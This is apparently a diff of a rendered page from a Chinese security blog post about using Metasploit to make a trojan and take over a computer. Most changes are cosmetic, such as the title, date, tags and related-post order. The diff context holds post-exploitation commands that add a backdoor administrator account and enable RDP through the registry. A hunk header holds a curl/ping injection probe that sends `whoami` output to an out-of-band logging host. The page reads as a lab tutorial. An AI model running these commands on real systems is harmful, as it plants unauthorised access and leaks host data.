@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      利用msf生成木马入侵电脑 | Ƥ����ջ
+      利用msf生成木马入侵电脑 | pidandoufu
     
   </title>
   <meta name="author" content="Ƥ������">
@@ -303,7 +303,7 @@
 
 	<a href="/2019/03/17/利用msf生成木马入侵电脑/" itemprop="url">
 		<time datetime="2019-03-17T09:38:33.000Z" itemprop="dateUpdated">
-	  		2019-04-22
+	  		2019-05-01
 	  </time>
 	</a> 
 
@@ -312,7 +312,13 @@
 		</span>
 		<span>
 			<i class="fa fa-tags"></i>
-					
+			
+	
+		<a href="/tags/msf/" class=" ">
+			msf
+		</a>
+	
+		
 		</span>
 		
 		
@@ -400,13 +406,8 @@
    ![](/img/aaa.png)
 
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user desk 123.com /add</span><br><span class="line">net localgroup administators desk /add</span><br></pre></td></tr></table></figure>
-</code></pre><p>​<br>​<br>​         ### 四，监听控制<br>​    </p>
-<pre><code>1. 开启3389远程端口
-
-   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
-
-
-2. 连接远程桌面,输入：
+</code></pre><p>​<br>​<br>​         ### 四，监听控制<br>​<br>​         1. 开启3389远程端口<br>​<br>            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p>
+<pre><code>2. 连接远程桌面,输入：
 
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.179.142</span><br></pre></td></tr></table></figure>
 </code></pre><p>​                            <img src="/img/110.png" alt>                         </p>
@@ -453,6 +454,57 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">
+								msf浏览器自动攻击			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 8日, 2019				
+							</p>
+							<p class="relate-post-content">
+								msf浏览器自动攻击
+首先查看数据库状态 ，并启动数据库12/etc/init.d/postgresql status/etc/init.d/postgresql start
+
+打开msf:1msfconsole
+搜索我们需要的浏览器...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="msf浏览器自动攻击">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/03/31/DNS欺骗/" title="DNS欺骗">
+								DNS欺骗			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 31日, 2019				
+							</p>
+							<p class="relate-post-content">
+								 实战DNS欺骗
+DNS（Domain Name System，域名系统）欺骗：DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/03/31/DNS欺骗/" title="DNS欺骗">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DNS欺骗">
+							</a>
+						</div>
+					</li>											
+			
 			
 					<li>
 						<div class="relate-post-text">
@@ -592,33 +644,6 @@ i. *nix:12curl http://ip.port.b182oj.ceye.io/`whoami`ping `whoami`.ip.port.b182o
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">
-								msf浏览器自动攻击			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 8日, 2019				
-							</p>
-							<p class="relate-post-content">
-								msf浏览器自动攻击
-首先查看数据库状态 ，并启动数据库12/etc/init.d/postgresql status/etc/init.d/postgresql start
-
-打开msf:1msfconsole
-搜索我们需要的浏览器...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="msf浏览器自动攻击">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
 							<a class="relate-post-title" href="/2019/04/01/HTTP三次挥手和四次挥手/" title="HTTP三次挥手和四次挥手">
 								HTTP三次挥手和四次挥手			
 							</a>
@@ -665,30 +690,6 @@ SYN是标志位，SYN=1表示请求连接
 							<a href="/2019/04/01/状态码/" title="状态码">				
 								
 								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="状态码">
-							</a>
-						</div>
-					</li>											
-			
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2019/03/31/DNS欺骗/" title="DNS欺骗">
-								DNS欺骗			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								三月 31日, 2019				
-							</p>
-							<p class="relate-post-content">
-								 实战DNS欺骗
-DNS（Domain Name System，域名系统）欺骗：DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2019/03/31/DNS欺骗/" title="DNS欺骗">				
-								
-								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DNS欺骗">
 							</a>
 						</div>
 					</li>											
